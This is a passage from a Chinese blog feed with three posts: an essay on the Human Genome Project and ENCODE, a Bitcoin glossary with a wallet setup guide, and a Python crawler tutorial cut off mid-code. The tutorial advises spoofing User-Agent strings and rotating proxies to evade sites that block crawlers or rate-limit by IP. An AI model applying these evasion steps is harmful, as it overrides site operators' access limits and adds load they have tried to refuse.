China</h2><p>作为继美、英、法、德、日6个成员国之后中唯一的发展中国家，中国对人类基因组的的贡献不只是工作量，在这个划时代的里程碑上，已经刻上了中国人的名字，中国在生物组学的发展上占有一席之地，通过参与这一计划，我们可以分享数据、资源、技术与发言权，最终来开发我国自己的基因资源。中国的加入改变了国际人类基因组计划原有的组织格局，提高其国际合作的形象，带来了国际社会对“国际人类基因组计划精神”的支持，联合国教科文组织关于人类基因组基本信息免费共享的声明，就是在中国代表的直接努力下促成的。可以说，中国需要人类基因组计划，而基因组计划也使我国的基因测序能力进人世界前列，在中国本土成长起来的作为我国基因组学的典型代表、创新型机构——华大基因已经成为全球最大的基因组学中心。</p><p>因此，人类基因组计划对华大基因的影响力也是举足轻重的，华大基因也因此而“生”的伟大。华大基因随着“国际人类基因组计划1%项目”的正式启动而诞生。华大基因自成立之日起就站在世界同步的轨迹上，使得中国的基因组学研究位于跟踪——参与——同步的国际地位。为后期的华大基因在基因组上的引领及跨越式发展奠定了基础。</p><p>在人类基因组计划之后，人类基因研究开始朝着与人类生育健康、肿瘤个体化治疗、病原微生物、遗传性疾病、血液病等的相关疾病的基因检测方向发展，未来，医疗技术将从末端的疾病治疗，逐步走向前端的基因诊断和预防，个性化医疗及精准医疗。人类将通过基因检测技术、通过个性化医疗以更精确的诊断，预测潜在疾病的风险，提供更有效、更有针对性的治疗，预防某种疾病的发生，比“治有病”更节约治疗成本。</p><p>华大基因希望凭借全球领先的基因组学技术，华大基因将千万家庭远离遗传性出生缺陷，肿瘤能早期检测和诊断并能全景式、定期监控个人健康动态，人人做到“我的基因我知道，我的健康我做主”。其研究方向主要涉及遗传性出生缺陷、肿瘤、心脑血管疾病、精准医疗 # The ENCODE Project</p><h2 id="the-profile-of-the-project-v2">The Profile of the Project</h2><p>The ENCODE Project（即Encyclopedia Of DNA Elements，中文译作DNA元件百科全书计划），是美国国立人类基因组研究院（US National Human Genome Research Institute，NHGRI）在2003年9月启动的跨国研究项目。该项目旨在解析人类基因组中的所有功能性元件，它是人类基因组计划完成之后，又一重要的跨国基因组学研究项目。该项目联合了来自美国，英国，西班牙，新加坡和日本的32个实验室的422名科学家的努力，获得了迄今最详细的人类基因组分析数据（他们获得并分析了超过15兆兆字节的原始数据）。研究花费了约300年的计算机时间，对147个组织类型进行了分析，以确定哪些能打开和关闭特定的基因，以及不同类型细胞之间的“开关”存在什么差异。</p><h2 id="the-achievement-of-the-project-v2">The Achievement of the Project</h2><p>近年来基因研究已经取得巨大进展。不过，迄今为止，这些研究主要还集中在编码蛋白的特定基因上，而它们所佔的比例不到整个人类基因组的2%。ENCODE计划首次系统地研究了所有类型的功能元件的位点和组织方式。</p><p>迄今为止，ENCODE计划主要集中研究了44个靶标共3000万个DNA硷基对。负责该计划数据整合和分析工作的欧洲分子生物学实验室主任Ewan Birney说：“我们的结论揭示了有关DNA功能元件构成的重要原理，为从DNA转录到哺乳动物进化的一切过程提供了新的认识。”</p><p>研究发现，人类基因组中的大多数DNA都会转录成RNA，这些副本会普遍交叠。因此，人类基因组实际上是一个非常复杂的网络，所谓的无用基因实际上非常少。基因只不过是众多具有特定功能的DNA序列类型之一。科学家们在基因之外的调控区域新发现了4491个转录启动位点，这一数字超过了已知基因的10倍。这些都挑战了长期以来的一个观点，即基因组中的基因是孤立的，同时，新的发现也支持了人类基因数量应该超过3万个的看法。</p><p>ENCODE计划的另一个巨大成就就是对哺乳动物基因组进化的认识。传统理论认为，与生理功能相关的重要DNA序列往往位于基因组中的“进化限制”区域，它们在物种进化过程中更容易保存下来。但是，最新的研究表明，大约一半人类基因组中的功能元件在进化过程中不会受到很大限制。科学家认为，哺乳动物缺乏“进化限制”这一点，很可能意味著许多物种的基因组都囊括了大量包括RNA转录副本在内的功能元件，在进化过程中，这些功能元件成了基因“仓库”。</p><p>此次ENCODE计划的成果亮点还包括：确定了许多之前不为人知的DNA转录启动位点；推翻了传统观点的认识，调控区域也有可能位于DNA转录启动位点的下游；确定了组蛋白变化的特定标记；加深了人们对组蛋白改变协调DNA复制的理解。</p><p>2012年9月5日，ENCODE项目的阶段性研究结果被整理成30篇论文发表于《自然》（6篇），《基因组研究》（6篇）和《基因组生物学》（18篇）上。</p><p>研究结果显示，人类基因组内的非编码DNA至少80%是有生物活性的，而并非之前认为的“垃圾” DNA （junk DNA）。这些新的发现有望帮助研究人员理解基因受到控制的途径，以及澄清某些疾病的遗传学风险因子。 ENCODE是人类基因组计划之后国际科学界在基因组学研究领域取得的又一重大进展。</p><p>2012年12月21日，ENCODE项目被《科学》杂志评为本年度十大科学突破之一。</p><h2 id="the-research-contents-of-the-project-v2">The Research Contents of the Project</h2><h3 id="试点研究的内容">试点研究的内容</h3><p>对编码的功能DNA进行鉴定和分类；对已存在的几种方法进行测试和比较，严格分析了人类基因组序列中已被定义的序列。</p><p>阐明人类生物学和疾病之间的关系。</p><p>对大量鉴定基因特征的方法、技术和手段进行检测和评估。</p><h3 id="研究对象">研究对象</h3><p>编码蛋白基因</p><p>非编码蛋白基因</p><p>调控区域</p><p>染色体结构维持和调节染色体复制能力的DNA元件</p><h3 id="研究特点">研究特点</h3><p>采用综合性研究策略</p><p>重视新技术的研发</p><p>将计划向学术界和公司开放</p><h2 id="the-contributions-of-the-project-v2">The Contributions of the Project</h2><h3 id="人细胞转录全景图">人细胞转录全景图</h3><p>通过ENCODE项目，人们知道RNA是基因组编码的遗传信息的直接输出。细胞的大部分调节功能都集中在RNA的合成、加工和运输、修饰和翻译之中。研究人员证实，75%的人基因组能够发生转录，并且观察到几乎所有当前已标注的RNA和上千个之前未标注的RNA的表达范围与水平、定位、加工命运、调节区和修饰。总之，这些观察结果表明人们需要重新定义基因的概念。</p><h3 id="人基因组中可访问的染色质全景图">人基因组中可访问的染色质全景图</h3><p>DNase I超敏感位点(DNase I hypersensitive sites, DHSs)是调节性DNA序列的标记物。研究人员通过对125个不同的细胞和组织类型进行全基因组谱分析而鉴定出大约290万个人DHSs，并且首次大范围地绘制出人DHSs图谱。</p><h3 id="基因启动子的远距离相互作用全景图">基因启动子的远距离相互作用全景图</h3><p>在ENCODE项目中，研究人员选择1%的基因组作为项目试点区域，并且利用染色体构象捕获碳拷贝(chromosome conformation capture carbon copy, 简称为5C)技术来综合性地分析了这个区域中转录起始位点和远端序列元件之间的相互作用。他们获得GM12878、K562和HeLa-S3细胞的5C图谱。在每个细胞系，他们发现启动子和远端序列元件之间存在1000多个远距离相互作用。</p><h3 id="gencode：encode项目的人基因组参照标注">GENCODE：ENCODE项目的人基因组参照标注</h3><p>GENCODE项目旨在利用计算分析、人工标注和实验验证来鉴定出人基因组中所有的基因特征。GENCODE第七版(GENCODE v7)公开发布了基因组标注数据集，包含了20687个蛋白编码的RNA基因座位、9640个长链非编码RNA基因座位，并且拥有33977个在UCSC基因数据库和RefSeq数据库中不存在的编码性转录本。它还对公开获得的长链非编码RNA(long noncoding RNA, lncRNA)进行最全面的标注。</p><h1>我的认识</h1><p>在上这门课之前，我从没认真想过这个问题，到底研究基因有什么用？通过这几天的学习，以及对文章所提的两个项目的检索、认识，我对基因测序这一工作，有了更深层次的认识。</p><p>虽然外界关于基因测序有不同的看法，例如有人支持，因为它可以为医学做贡献；有人反对，因为这样做相当于为基因做了一次曝光，这样一来，就有优劣基因之分。在我看来，这一任务还是利大于弊的，毕竟现在看来是这样。科学家可以通过对已有的基因测序结果的分析，总结出基因的“中心法则”，使我们对自身有了更进一步的了解。再者，基因分析有很多好的应用，通过对胎儿基因分析可以达到优生的目的，以及对有基因缺陷、先天性遗传病患者可以提供治标治本的治疗方案。</p><p>当然，要了解所有基因的功能还有很长的一段路要走。例如以前人们所认为的垃圾DNA实际上并不“垃圾”，它们在基因组的进化、每个个体的差异性以及许多其他方面扮演着重要角色，是世界上许多实验室着力研究的目标。</p><p>即使已经过了将近30年，人类基因组也没有完成“完全”测序，不过我们了解到了基因并不是静态的，而是处在复杂的变化之中，所以对人类基因的研究也是对人类自身的研究，这一研究将会一直进行下去，永无终点。 虽然人类基因组目前也只是一张初步的蓝图，需要经过更多的研究和分析。但是人类已经通过对基因组的学习，进入了医学的新纪元，为预防、诊断和治疗疾病带来了新的方法。所以对基因组的研究势必将成为人类新的曙光。</p><p>总之，我对基因组计划以及ENCODE计划充满期待与支持。</p><h1>参考资料</h1><ol>  <li>HGP计划百度百科：<a href="http://dwz.cn/3ITVf3" target="_blank" rel="noopener">http://dwz.cn/3ITVf3</a></li>  <li>人类基因组计划- 维基百科http://dwz.cn/3JHOap</li>  <li>科学松鼠会之人类基因组计划 <a href="http://dwz.cn/3JHOXZ" target="_blank" rel="noopener">http://dwz.cn/3JHOXZ</a></li>  <li>ENCODE项目百度百科：<a href="http://dwz.cn/3ITSPr" target="_blank" rel="noopener">http://dwz.cn/3ITSPr</a></li>  <li>Genome网 <a href="https://www.genome.gov/10005107/encode-project" target="_blank" rel="noopener">https://www.genome.gov/10005107/encode-project</a></li>  <li>ENCODE项目官网：<a href="https://www.encodeproject.org" target="_blank" rel="noopener">https://www.encodeproject.org</a></li>  <li>“DNA元件百科全书”首批成果出炉，链接：<a href="http://big5.cas.cn/xw/kjsm/gjdt/200706/t20070619_1011212.shtml" target="_blank" rel="noopener">http://big5.cas.cn/xw/kjsm/gjdt/200706/t20070619_1011212.shtml</a></li></ol><p><br><br>本文链接： <a href="http://home.meng.uno/articles/32469d52/">http://home.meng.uno/articles/32469d52/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Human Genome Project
The Profile of the Project
人类基因组计划(Human Genome Project,简称HGP)是由美国科学家于1985年率先提出，又于1990年正式启动的。来自美国、英国、法国、德国、日本和中国科学家共同参与了这一预算达30亿美元的人类基因组计划。按照这个计划的设想，在2005年，要把人体内约10万个基因的密码全部解开，同时绘制出人类基因的谱图。换句话说，就是要揭开组成人体4万个基因的30亿个碱基对的秘密。

这一计划的最终目的是测定人类基因组30亿个基本化学组成（称为碱基对或核苷酸），进而揭开与人类的生老病死有关的数万个
    
    </summary>
    
      <category term="Bioinformatics" scheme="http://home.meng.uno/categories/Bioinformatics/"/>
    
    
      <category term="生物信息" scheme="http://home.meng.uno/tags/%E7%94%9F%E7%89%A9%E4%BF%A1%E6%81%AF/"/>
    
      <category term="Genome" scheme="http://home.meng.uno/tags/Genome/"/>
    
      <category term="ENCODE" scheme="http://home.meng.uno/tags/ENCODE/"/>
    
  </entry>
  
  <entry>
    <title>关于比特币（Bitcoin）</title>
    <link href="http://home.meng.uno/articles/7bfe1542/"/>
    <id>http://home.meng.uno/articles/7bfe1542/</id>
    <published>2018-02-14T11:47:44.000Z</published>
    <updated>2020-12-02T01:41:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1>比特币术语</h1><h2 id="比特币">比特币</h2><p>首字母大写的Bitcoin用来表示比特币的概念或整个比特币网络本身。例如：“今天我学了些有关Bitcoin协议的内容。”</p><p>而没有大写的bitcoin则表示一个记账单位。例如：“我今天转出了10个bitcoin。”该单位通常也简写为BTC或XBT。</p><h2 id="比特币地址">比特币地址</h2><p>比特币地址就像一个物理地址或者电子邮件地址。这是别人付给你比特币时你唯一需要提供的信息。然而一个重要的区别是，每个地址应该只用于单笔交易。</p><h2 id="对等式网络">对等式网络</h2><p>对等式网络是指，通过允许单个节点与其他节点直接交互，从而实现整个系统像有组织的集体一样运作的系统 。对于比特币来说，比特币网络以这样一种方式构建——每个用户都在传播其他用户的交易。而且重要的是，不需要银行作为第三方。</p><h2 id="哈希率">哈希率</h2><p>哈希率是衡量比特币网络处理能力的测量单位。为保证安全，比特币网络必须进行大量的数学运算。当网络达到10Th/秒的哈希率时，就意味着它能够进行每秒10万亿次的计算。</p><h2 id="交易确认">交易确认</h2><p>交易确认意味着一笔交易已经被网络处理且不太可能被撤销。当交易被包含进一个块时会收到一个确认，后续的每一个块都对应一个确认。对于小金额交易单个确认便可视为安全，然而对于比如1000美元的大金额交易，等待6个以上的确认比较合理。每一个确认都成指数级地降低交易撤销的风险。</p><h2 id="块链">块链</h2><p>块链是一个按时间顺序排列的比特币交易公共记录。块链由所有比特币用户共享。它被用来验证比特币交易的永久性并防止双重消费。</p><h2 id="密码学">密码学</h2><p>密码学是数学的一个分支，它让我们创造出可以提供很高安全性的数学证明。电子商务和网上银行也用到了密码学。对于比特币来说，密码学用来保证任何人都不可能使用他人钱包里的资金，或者破坏块链。密码学也用来给钱包加密，这样没有密码就用不了钱包。</p><h2 id="签名">签名</h2><p>密码学签名是一个让人可以证明所有权的数学机制。对于比特币来说，一个比特币钱包和它的私钥通过一些数学魔法关联到一起。当你的比特币软件用对应的私钥为一笔交易签名，整个网络都能知道这个签名和已花费的比特币相匹配。但是，世界上没有人可以猜到你的私钥来窃取你辛苦赚来的比特币。</p><h2 id="钱包">钱包</h2><p>比特币钱包大致实体钱包在比特币网络中的等同物。钱包中实际上包含了你的私钥，可以让你消费块链中分配给钱包的比特币。和真正的钱包一样，每个比特币钱包都可以显示它所控制的所有比特币的总余额，并允许你将一定金额的比特币付给某人。这与商家进行扣款的信用卡不同。</p><h2 id="区块">区块</h2><p>一个块是块链中的一条记录，包含并确认待处理的交易。平均约每10分钟就有一个包含交易的新块通过挖矿的方式添加到块链中。</p><h2 id="双重消费">双重消费</h2><p>如果一个不怀好意的用户试图将比特币同时支付给两个不同的收款人，就被称为双重消费。比特币挖矿和块链将就两比交易中那笔获得确认并被视为有效在网络上达成一致。</p><h2 id="私钥">私钥</h2><p>私钥是一个证明你有权从一个特定的钱包消费比特币的保密数据块，是通过一个密码学签名来实现的 。如果你使用的是钱包软件，你的私钥就存储在你的计算机内；如果使用的是在线钱包，你的私钥就存储在远程服务器上。千万不能泄露私钥，因为它们可以让你消费对应比特币钱包里的比特币。</p><h2 id="挖矿">挖矿</h2><p>比特币挖矿是利用计算机硬件为比特币网络做数学计算进行交易确认和提高安全性的过程。作为对他们服务的奖励，矿工可以得到他们所确认的交易中包含的手续费，以及新创建的比特币。挖矿是一个专业的、竞争激烈的市场，奖金按照完成的计算量分割。并非所有的比特币用户都挖矿，挖矿赚钱也并不容易。</p><h2 id="bit">Bit</h2><p>Bit是标明一个比特币的次级单位的常用单位 1,000,000 bit 等于1 比特币 (BTC 或 B⃦).，这个单位对于标示小费、商品和服务价格更方便。</p><h2 id="btc">BTC</h2><p>BTC 是用于标示一个比特币 (B⃦). 的常用单位。</p><h1>比特币账户</h1><p>我们可以在<code>bitcoin.org</code>上选择自己的钱包。我在这里向大家展示使用一个浏览器插件<code>GreenAddress</code>，下载链接是：<code>https://chrome.google.com/webstore/detail/greenaddress/dgbimgjoijjemhdamicmljbncacfndmp/related</code></p><h2 id="注册">注册</h2><p>打开安装好的<code>GreenAddress</code>，没有账户点击右上角，开始注册。</p><p><img src="http://www.meng.uno/images/bitcoins/1.jpg" alt="BITCOIN"></p><p><strong>打码的位置请保存下来，需要用它来在其他地方登录或者恢复钱包</strong></p><p>接着是验证你保存没保存（想的还很周到）。</p><p>再就是添加两步验证，这个比较常见了，我只选了“邮件”验证，推荐是选两个，要不然总是有warning。</p><p><img src="http://www.meng.uno/images/bitcoins/2.jpg" alt="BITCOIN"></p><h2 id="使用">使用</h2><p>接着就进入主界面了，有很多配置需要大家自己去查看，主界面显示了你的“Bitcoin URI”，分享这个，别人就可以向你转钱了，当然别人也可以扫描你的二维码向你转钱。</p><p><img src="http://www.meng.uno/images/bitcoins/3.jpg" alt="BITCOIN"></p><p><strong>最后强调一下，我的比特币地址是：15HVex2sMR1XRZXS14VGGqpQwvoMAeTAgc</strong></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7bfe1542/">http://home.meng.uno/articles/7bfe1542/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      比特币术语
比特币
首字母大写的Bitcoin用来表示比特币的概念或整个比特币网络本身。例如：“今天我学了些有关Bitcoin协议的内容。”

而没有大写的bitcoin则表示一个记账单位。例如：“我今天转出了10个bitcoin。”该单位通常也简写为BTC或XBT。

比特币地址
比特币地址就像一个物理地址或者电子邮件地址。这是别人付给你比特币时你唯一需要提供的信息。然而一个重要的区别是，每个地址应该只用于单笔交易。

对等式网络
对等式网络是指，通过允许单个节点与其他节点直接交互，从而实现整个系统像有组织的集体一样运作的系统 。对于比特币来说，比特币网络以这样一种方式构建——每个用户都在传
    
    </summary>
    
      <category term="FinTech" scheme="http://home.meng.uno/categories/FinTech/"/>
    
    
      <category term="比特币" scheme="http://home.meng.uno/tags/%E6%AF%94%E7%89%B9%E5%B8%81/"/>
    
      <category term="Bitcoin" scheme="http://home.meng.uno/tags/Bitcoin/"/>
    
  </entry>
  
  <entry>
    <title>简单的Python3爬虫</title>
    <link href="http://home.meng.uno/articles/51d32f19/"/>
    <id>http://home.meng.uno/articles/51d32f19/</id>
    <published>2018-02-12T12:18:15.000Z</published>
    <updated>2020-12-02T01:42:21.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>我们先从分析原理入手，然后再使用Python提供的基本的库urllib。</p>  <p>注意，我全程使用的是Python3，如果你必须使用不同版本，请自行百度某些库及函数的转换，需要使用的库不一定你的电脑上预装了，所以请自行百度安装。</p></blockquote><h1>原理</h1><p>网络爬虫，也叫网络蜘蛛(Web Spider)，如果把互联网比喻成一个蜘蛛网，Spider就是一只在网上爬来爬去的蜘蛛。网络爬虫就是根据网页的地址来寻找网页的，也就是URL。</p><h2 id="url">URL</h2><p>URL就是统一资源定位符(Uniform Resource Locator)，它的一般格式如下(带方括号[]的为可选项)：</p><p><code>protocol ://hostname[:port]/path/[;parameters][?query]#fragment</code></p><p>可见，一个URL包含三个部分：</p><ol>  <li>protocol：协议，例如https，http等；</li>  <li>hostname[:port]：主机名(端口号为可选参数)，一般网站默认的端口号为80，例如我的博客域名www.meng.uno，可以作为主机名使用;</li>  <li>path：第三部分就是主机资源的具体地址，如目录和文件名等。</li></ol><p>爬虫就是向URL发送请求，然后得到响应，基本就实现了爬取网页的功能。</p><p><strong>URI可以分为URL,URN或同时具备locators 和names特性的一个东西。URN作用就好像一个人的名字，URL就像一个人的地址。换句话说：URN确定了东西的身份，URL提供了找到它的方式。</strong></p><h2 id="从浏览器发送和接收数据看起">从浏览器发送和接收数据看起</h2><p>进入我的首页<code>www.meng.uno</code>，打开浏览器的“检查”功能，选项卡选到“Network”，然后点击所有文章，随便选择一条，我们可以发现如下截图的&quot;Headers&quot;</p><p><img src="http://meng.uno/images/crawl/1.png" alt="Headers"></p><p>我们可以发现最明显的有两个区域（我已经圈出来了）：“request”和“response”。从字面意思上来看，我们就知道分别是（发送的）请求和（收到的）回复。</p><p>接收的信息是我们请求的网页给的，不用我们管，但是“请求的网页”是我们需要提前设定的，当然最简单的方式就是什么都不设置。爬虫会增加网站的负荷，所以很多网站希望大家通过API的方式使用其开放的资源而禁止爬虫，其中的一个做法就是判断你的请求内容（不全的基本都是爬虫）。于是，为了做到一个完整的可用的爬虫，我们需要模拟真实用户的请求，这就要求我们伪造“User Agent”。</p><p>常见的“User Agent”列举如下：</p><ol>  <li>    <p>Android</p>    <ul>      <li>Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19</li>      <li>Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</li>      <li>Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-P1000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</li>    </ul>  </li>  <li>    <p>Firefox</p>    <ul>      <li>Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0</li>      <li>Mozilla/5.0 (Android; Mobile; rv:14.0) Gecko/14.0 Firefox/14.0</li>    </ul>  </li>  <li>    <p>Google Chrome</p>    <ul>      <li>Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36</li>      <li>Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19</li>    </ul>  </li>  <li>    <p>iOS</p>    <ul>      <li>Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3</li>      <li>Mozilla/5.0 (iPod; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A101a Safari/419.3</li>    </ul>  </li></ol><p>User Agent已经设置好了，但是还应该考虑一个问题，程序的运行速度是很快的，如果我们利用一个爬虫程序在网站爬取东西，一个固定IP的访问频率就会很高，这不符合人为操作的标准，因为人操作不可能在几ms内，进行如此频繁的访问。所以一些网站会设置一个IP访问频率的阈值，如果一个IP访问频率超过这个阈值，说明这个不是人在访问，而是一个爬虫程序。</p><p>一个很简单的解决办法就是设置延时，但是这显然不符合爬虫快速爬取信息的目的，所以另一种更好的方法就是使用IP代理。使用代理的步骤：</p><ul>  <li>调用urlib.request.ProxyHandler()，proxies参数为一个字典；</li>  <li>创建Opener(类似于urlopen，这个代开方式是我们自己定制的)；</li>  <li>安装Opener；</li></ul><p><strong>这个网站提供了很多代理主机：<a href="http://www.xicidaili.com/" target="_blank" rel="noopener">http://www.xicidaili.com/</a></strong></p><h2 id="正则表达式">正则表达式</h2><p>我直接以表格的形式呈现好了：</p><table>  <thead>    <tr>      <th style="text-align:center">元字符</th>      <th style="text-align:right">说明</th>    </tr>  </thead>  <tbody>    <tr>      <td style="text-align:center">.</td>      <td style="text-align:right">代表任意字符</td>    </tr>    <tr>      <td style="text-align:center"></td>      <td style="text-align:right"></td>    </tr>    <tr>      <td style="text-align:center">[ ]</td>      <td style="text-align:right">匹配内部的任一字符或子表达式</td>    </tr>    <tr>      <td style="text-align:center">[^]</td>      <td style="text-align:right">对字符集和取非</td>    </tr>    <tr>      <td style="text-align:center">-</td>      <td style="text-align:right">定义一个区间</td>    </tr>    <tr>      <td style="text-align:center">\</td>      <td style="text-align:right">对下一字符取非（通常是普通变特殊，特殊变普通）</td>    </tr>    <tr>      <td style="text-align:center">*</td>      <td style="text-align:right">匹配前面的字符或者子表达式0次或多次</td>    </tr>    <tr>      <td style="text-align:center">*?</td>      <td style="text-align:right">惰性匹配上一个</td>    </tr>    <tr>      <td style="text-align:center">+</td>      <td style="text-align:right">匹配前一个字符或子表达式一次或多次</td>    </tr>    <tr>      <td style="text-align:center">+?</td>      <td style="text-align:right">惰性匹配上一个</td>    </tr>    <tr>      <td style="text-align:center">?</td>      <td style="text-align:right">匹配前一个字符或子表达式0次或1次重复</td>    </tr>    <tr>      <td style="text-align:center">{n}</td>      <td style="text-align:right">匹配前一个字符或子表达式</td>    </tr>    <tr>      <td style="text-align:center">{m,n}</td>      <td style="text-align:right">匹配前一个字符或子表达式至少m次至多n次</td>    </tr>    <tr>      <td style="text-align:center">{n,}</td>      <td style="text-align:right">匹配前一个字符或者子表达式至少n次</td>    </tr>    <tr>      <td style="text-align:center">{n,}?</td>      <td style="text-align:right">前一个的惰性匹配</td>    </tr>    <tr>      <td style="text-align:center">^</td>      <td style="text-align:right">匹配字符串的开头</td>    </tr>    <tr>      <td style="text-align:center">\A</td>      <td style="text-align:right">匹配字符串开头</td>    </tr>    <tr>      <td style="text-align:center">$</td>      <td style="text-align:right">匹配字符串结束</td>    </tr>    <tr>      <td style="text-align:center">[\b]</td>      <td style="text-align:right">退格字符</td>    </tr>    <tr>      <td style="text-align:center">\c</td>      <td style="text-align:right">匹配一个控制字符</td>    </tr>    <tr>      <td style="text-align:center">\d</td>      <td style="text-align:right">匹配任意数字</td>    </tr>    <tr>      <td style="text-align:center">\D</td>      <td style="text-align:right">匹配数字以外的字符</td>    </tr>    <tr>      <td style="text-align:center">\t</td>      <td style="text-align:right">匹配制表符</td>    </tr>    <tr>      <td style="text-align:center">\w</td>      <td style="text-align:right">匹配任意数字字母下划线</td>    </tr>    <tr>      <td style="text-align:center">\W</td>      <td style="text-align:right">不匹配数字字母下划线</td>    </tr>  </tbody></table><h1>代码</h1><h2 id="简单带错误信息的获取网页内所有url的爬虫">简单带错误信息的获取网页内所有URL的爬虫</h2><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">#获取URL的包</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment">#获取字符集编码方式</span></span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"><span class="comment">#正则表达式</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#Request 对象</span></span><br><span class="line">req = urllib.request.Request(<span class="string">"http://meng.uno/"</span>)</span><br><span class="line">data = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#得到Response</span></span><br><span class="line">    response = urllib.request.urlopen(req,data)</span><br><span class="line">    <span class="comment">#读出response == 请求文件的全部字符</span></span><br><span class="line">    html = response.read()</span><br><span class="line">    <span class="comment">#获取这个response的编码方式</span></span><br><span class="line">    charset = chardet.detect(html)</span><br><span class="line">    print(<span class="string">"编码方式："</span>,charset)</span><br><span class="line">    <span class="comment">#以这种编码方式解码打印</span></span><br><span class="line">    html = html.decode(charset.get(<span class="string">"encoding"</span>))</span><br><span class="line">    print(html)</span><br><span class="line">    urls = re.findall(<span class="string">'href=\"https*://w*\.*meng\.uno/.*?\"'</span>, html,re.S)</span><br><span class="line">    uris = re.findall(<span class="string">'href=\"/[^/].*?[^\.]\"'</span>,html, re.S)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> urls:</span><br><span class="line">        print(item[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> uris:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">".html"</span> <span class="keyword">in</span> item:</span><br><span class="line">            print(<span class="string">"http://www.meng.uno"</span>+item[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'.'</span> <span class="keyword">in</span> item:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"http://www.meng.uno"</span>+item[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">if</span> hasattr(e, <span class="string">'code'</span>):</span><br><span class="line">        print(<span class="string">"HTTPError"</span>)</span><br><span class="line">        print(e.code)</span><br><span class="line">    <span class="keyword">elif</span> hasattr(e, <span class="string">'reason'</span>):</span><br><span class="line">        print(<span class="string">"URLError"</span>)</span><br><span class="line">        print(e.reason)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="模拟真实环境的爬虫">模拟真实环境的爬虫</h2><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> <span class="comment">#访问网址</span></span><br><span class="line">url = <span class="string">'http://www.whatismyip.com.tw/'</span></span><br><span class="line"><span class="comment">#这是代理IP</span></span><br><span class="line">proxy = &#123;<span class="string">'https'</span>:<span class="string">'110.73.48.189:8123'</span>&#125;</span><br><span class="line"><span class="comment">#创建ProxyHandler</span></span><br><span class="line">proxy_support = urllib.request.ProxyHandler(proxy)</span><br><span class="line"><span class="comment">#创建Opener</span></span><br><span class="line">opener = urllib.request.build_opener(proxy_support)</span><br><span class="line"><span class="comment">#添加User Angent</span></span><br><span class="line">opener.addheaders = [(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>)]</span><br><span class="line"><span class="comment">#安装OPener</span></span><br><span class="line">urllib.request.install_opener(opener)</span><br><span class="line"><span class="comment">#使用自己安装好的Opener</span></span><br><span class="line">response = urllib.request.urlopen(url)</span><br><span class="line"><span class="comment">#读取相应信息并解码</span></span><br><span class="line">html = response.read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="comment">#打印信息</span></span><br><span 